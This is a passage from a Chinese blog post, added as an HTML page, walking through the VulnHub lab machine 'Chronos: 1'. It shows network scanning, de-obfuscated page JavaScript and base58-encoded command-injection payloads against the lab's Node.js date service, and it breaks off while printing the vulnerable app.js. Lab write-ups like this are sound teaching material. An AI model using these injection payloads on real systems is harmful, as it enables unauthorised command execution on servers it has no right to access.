@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chronos: 1">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/09/23/Chronos%201/index.html">
+<meta property="og:site_name" content="Phantom&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-09-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-10T14:13:24.593Z">
+<meta property="article:author" content="Phantom">
+<meta property="article:tag" content="Vulnhub">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="反弹 shell">
+<meta property="article:tag" content="Command Injection">
+<meta property="article:tag" content="Buffer Overflow">
+<meta property="article:tag" content="Neo-reGeorg">
+<meta property="article:tag" content="内网穿透">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="JavaScript Prototype 污染攻击">
+<meta property="article:tag" content="node 提权">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/09/23/Chronos%201/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/09/23/Chronos%201/","path":"2024/09/23/Chronos 1/","title":"Chronos: 1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Chronos: 1 | Phantom's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Phantom's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3-imera"><span class="nav-text">2.2. 提权至 imera</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3-root"><span class="nav-text">2.3. 提权至 root</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%9B%98"><span class="nav-text">3. 复盘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.1. 命令注入漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">4. 参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Phantom"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Phantom</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">156</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/09/23/Chronos%201/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Phantom">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phantom's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Chronos: 1 | Phantom's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Chronos: 1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-23 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-23T00:00:00+08:00">2024-09-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 22:13:24" itemprop="dateModified" datetime="2024-10-10T22:13:24+08:00">2024-10-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>15 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/chronos-1,735/">Chronos:
+1 ~ VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 10.0.3.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：10.0.3.27</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV 10.0.3.27 -p-        </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 21:58 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.27</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">8000/tcp open  http    Node.js Express framework</span><br><span class="line">MAC Address: 08:00:27:72:71:B6 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 44.52 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>80 主页源码有被混淆后的 JS 代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义混淆后的字符串数组</span></span><br><span class="line"><span class="keyword">var</span> _0x5bdf = [</span><br><span class="line">    <span class="string">&#x27;150447srWefj&#x27;</span>, <span class="string">&#x27;70lwLrol&#x27;</span>, <span class="string">&#x27;1658165LmcNig&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;1260881JUqdKM&#x27;</span>, <span class="string">&#x27;10737CrnEEe&#x27;</span>, <span class="string">&#x27;2SjTdWC&#x27;</span>, <span class="string">&#x27;readyState&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;responseText&#x27;</span>, <span class="string">&#x27;1278676qXleJg&#x27;</span>, <span class="string">&#x27;797116soVTES&#x27;</span>, <span class="string">&#x27;onreadystatechange&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>, <span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;1DYOODT&#x27;</span>, <span class="string">&#x27;400909Mbbcfr&#x27;</span>, <span class="string">&#x27;Chronos&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;2QRBPWS&#x27;</span>, <span class="string">&#x27;getElementById&#x27;</span>, <span class="string">&#x27;innerHTML&#x27;</span>, <span class="string">&#x27;date&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码函数，用于将混淆后的字符串恢复</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">_0x506b95, _0x817e36</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x244260 = _0x432d;</span><br><span class="line">    <span class="keyword">while</span> (!![]) &#123;  <span class="comment">// 无限循环，直到条件满足</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x35824b = -<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x7e</span>)) * <span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x90</span>)) </span><br><span class="line">                            + <span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x8e</span>)) </span><br><span class="line">                            + <span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x7f</span>)) * <span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x83</span>)) </span><br><span class="line">                            + -<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x87</span>)) </span><br><span class="line">                            + -<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x82</span>)) * <span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x8d</span>)) </span><br><span class="line">                            + -<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x88</span>)) </span><br><span class="line">                            + <span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x80</span>)) * <span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x84</span>));</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (_0x35824b === _0x817e36) <span class="keyword">break</span>;  <span class="comment">// 如果条件满足，则退出循环</span></span><br><span class="line">            <span class="keyword">else</span> _0x506b95.<span class="title function_">push</span>(_0x506b95.<span class="title function_">shift</span>());  <span class="comment">// 不满足时，调整数组</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (_0x3fb1dc) &#123;</span><br><span class="line">            _0x506b95.<span class="title function_">push</span>(_0x506b95.<span class="title function_">shift</span>());  <span class="comment">// 异常处理，继续调整数组</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;(_0x5bdf, <span class="number">0xcaf1e</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码字符串的函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_0x432d</span>(<span class="params">_0x16bd66, _0x33ffa9</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x432d = <span class="keyword">function</span>(<span class="params">_0x5bdf82, _0x432dc8</span>) &#123;</span><br><span class="line">        _0x5bdf82 = _0x5bdf82 - <span class="number">0x7e</span>;</span><br><span class="line">        <span class="keyword">var</span> _0x4da6e8 = _0x5bdf[_0x5bdf82];</span><br><span class="line">        <span class="keyword">return</span> _0x4da6e8;</span><br><span class="line">    &#125;, <span class="title function_">_0x432d</span>(_0x16bd66, _0x33ffa9);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 核心函数：发送异步请求并将结果显示在页面上</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadDoc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x17df92 = _0x432d,</span><br><span class="line">        _0x1cff55 = <span class="title function_">_0x17df92</span>(<span class="number">0x8f</span>),  <span class="comment">// 解码的 User-Agent 值</span></span><br><span class="line">        _0x2beb35 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();  <span class="comment">// 创建新的 XMLHttpRequest 对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当请求状态发生变化时触发的事件处理器</span></span><br><span class="line">    _0x2beb35[<span class="title function_">_0x17df92</span>(<span class="number">0x89</span>)] = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x146f5d = _0x17df92;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 当请求完成并且返回状态为 200 时，更新页面内容</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x85</span>)] == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x8c</span>)] == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="variable language_">document</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x91</span>)](<span class="title function_">_0x146f5d</span>(<span class="number">0x93</span>))[<span class="title function_">_0x146f5d</span>(<span class="number">0x92</span>)] = <span class="variable language_">this</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x86</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开一个 GET 请求，目标是本地的日期服务器</span></span><br><span class="line">    _0x2beb35[<span class="title function_">_0x17df92</span>(<span class="number">0x81</span>)](<span class="string">&#x27;GET&#x27;</span>, <span class="title function_">_0x17df92</span>(<span class="number">0x8a</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置请求头中的 User-Agent</span></span><br><span class="line">    _0x2beb35[<span class="string">&#x27;setRequestHeader&#x27;</span>](<span class="title function_">_0x17df92</span>(<span class="number">0x8b</span>), _0x1cff55);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送请求</span></span><br><span class="line">    _0x2beb35[<span class="string">&#x27;send&#x27;</span>]();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>根据提示修改 hosts: chronos.local <span
+class="math inline">\(\rightarrow\)</span> 10.0.3.27</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># echo &quot;4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&quot; | base58 -d</span></span><br><span class="line"><span class="string">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span> </span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409251514306.jpg" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409251549446.jpg" /></p>
+<p>推测存在命令注入，测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat osinject         </span></span><br><span class="line"><span class="string">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span> &amp;&amp; <span class="built_in">ls</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat osinject | base58</span></span><br><span class="line">ev6bGy99wjnctA21ATvLR8Xkptotq1Ssu3SZR3efG68AVURHQ3kEK7tDw</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409251612467.jpg" /></p>
+<p>存在命令注入</p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>读取 app.js 发现服务端做了一定的过滤</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat osinject         </span></span><br><span class="line">&amp;&amp; <span class="built_in">cat</span> app.js</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat osinject | base58</span></span><br><span class="line">F2SaQPcBAqjby5ub99B</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409251625408.jpg" /></p>
+<p>app.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); <span class="comment">// 导入express框架</span></span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>); <span class="comment">// 导入用于执行系统命令的模块</span></span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>); <span class="comment">// 导入Base58编码解码模块</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); <span class="comment">// 创建express应用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>; <span class="comment">// 定义端口号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>); <span class="comment">// 导入CORS模块以支持跨域请求</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>()); <span class="comment">// 使用CORS中间件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 